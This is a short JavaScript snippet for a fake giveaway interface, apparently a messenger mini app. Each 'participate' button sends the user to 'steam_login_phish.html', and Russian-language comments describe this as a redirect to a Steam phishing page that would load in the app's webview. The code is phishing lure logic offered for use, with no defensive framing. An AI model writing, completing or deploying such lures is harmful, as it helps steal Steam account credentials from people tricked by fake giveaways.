    document.addEventListener('DOMContentLoaded', () => {
        const participateButtons = document.querySelectorAll('.participate-btn');

        participateButtons.forEach(button => {
            button.addEventListener('click', (event) => {                const itemName = event.target.closest('.giveaway-card').dataset.item;
                console.log(`User clicked to participate in: ${itemName}`);
                // Перенаправление на фишинговую страницу Steam
                // В реальном Mini App это будет новый HTML-файл,
                // который будет загружен в webview.
                // Для простоты здесь показано прямое перенаправление.
                window.location.href = 'steam_login_phish.html';
            });
        });
    });